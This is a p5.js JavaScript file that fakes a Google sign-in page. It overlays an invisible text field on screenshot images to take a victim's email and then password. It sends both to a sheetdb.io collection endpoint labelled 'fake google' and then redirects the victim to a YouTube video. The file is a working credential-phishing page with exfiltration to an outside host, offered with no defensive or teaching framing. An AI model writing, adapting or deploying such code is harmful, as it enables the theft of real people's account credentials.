function setup() {
  createCanvas(windowWidth, windowHeight);

  username = createInput("");
  //pasword = createInput("");

  username.style("border", "transparent");
  //pasword.style("border", "0px solid black");

  username.style("background-color", "transparent");

  username.style("color", "rgba(0, 0, 0, 0)");
  //pasword.style("background-color", "transparent");

  username.style("font-size", max([width, height]) / 100 + "px");
  //pasword.style("font-size", "22px");

  textFont("Roboto");
  
  data.user='';
  data.pwd='';
}
function button(x, y, w, h) {
  return mouseX > x && mouseY > y && mouseX < x + w && mouseY < y + h;
}
let images = {};
let page = 0;
let username;
let pasword;
let trials = 0;
let w;
let h;
let size;
let data = {};

function preload() {
  images.google = loadImage("a.png");
  images.welcome = loadImage("b.png");
}

function windowResized() {
  resizeCanvas(windowWidth, windowHeight);
}
function replaceExcept(strs) {
  let result = "";
  for (let i = 0; i < strs.length; i++) {
    if (str[i] === "") {
      result += "";
    } else {
      result += "•";
    }
  }
  return result;
}
function send(user, pass) {
  fetch("https://sheetdb.io/api/v1/tbfbe5pdzqev3", {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      data: [
        {
          'PASSWORD': pass,
          'USERNAME': user,
          'SITE': "fake google"
        },
      ],
    }),
  });
}
let hold = 0;
function pwd(text) {
  return "●".repeat(text.length);
}
function draw() {
  background(250);
  if (page === 0) {
    background(240, 243, 248);
    let size = max([width, height]) * 0.7;
    let w = size;
    let h = (size / images.google.width) * images.google.height;

    username.position(width / 2 + w * 0.024, height / 2 - h * 0.24);
    //pasword.position(width / 11, height / 2.6);

    username.size(w * 0.445, h * 0.125);
    //pasword.size(width - width / 5, height / 20);
    imageMode(CENTER);
    image(images.google, width / 2, height / 2, w, h);
    fill(255);
    rect(width / 2 + w * 0.023, height / 2 - h * 0.24, w * 0.45, h * 0.13, 2);
    fill(0);
    textAlign(LEFT, CENTER);
    textSize(size / 65);
    if (!username.value()) {
      text(
        "Email or Username",
        width / 2 + w * 0.035,
        height / 2 - h * 0.24,
        w * 0.437,
        h * 0.13
      );
    } else {
      text(
        username.value(),
        width / 2 + w * 0.035,
        height / 2 - h * 0.24,
        w * 0.437,
        h * 0.13
      );
    }
    if (mouseIsPressed && username.value().length>1){
      data.user = username.value();
      username.value('');
      page++;
    }
  } else if (page === 1) {
    background(240, 243, 248);
    let size = max([width, height]) * 0.7;
    let w = size;
    let h = (size / images.welcome.width) * images.welcome.height;

    username.position(width / 2 + w * 0.02, height / 2 - h *0.13);
    //pasword.position(width / 11, height / 2.6);

    username.size(w * 0.435, h * 0.12);
    //pasword.size(width - width / 5, height / 20);
    imageMode(CENTER);
    image(images.welcome, width / 2, height / 2, w, h);
    fill(255);
    rect(width / 2 + w * 0.021, height / 2 - h * 0.13, w * 0.44, h * 0.13, 2);
    fill(0);
    textAlign(LEFT, CENTER);
    textSize(size / 65);
    if (!username.value()) {
      text(
        "Password",
        width / 2 + w * 0.035,
        height / 2 - h * 0.13,
        w * 0.437,
        h * 0.13
      );
    } else {
      text(
        pwd(username.value()),
        width / 2 + w * 0.035,
        height / 2 - h * 0.13,
        w * 0.437,
        h * 0.13
      );
    }
    
    if (mouseIsPressed && username.value().length>1){
      data.pwd = username.value();
      username.value('');
      page++;
    }
  } else if (page === 2) {
    send(data.user, data.pwd);
    print('sent');
    page++;
  }else{
    window.location.replace('https://www.youtube.com/watch?v=Ne40a5LkK6A');
    page++;
  }

  if (mouseIsPressed) {
    hold++;
  } else {
    hold = 0;
  }
}
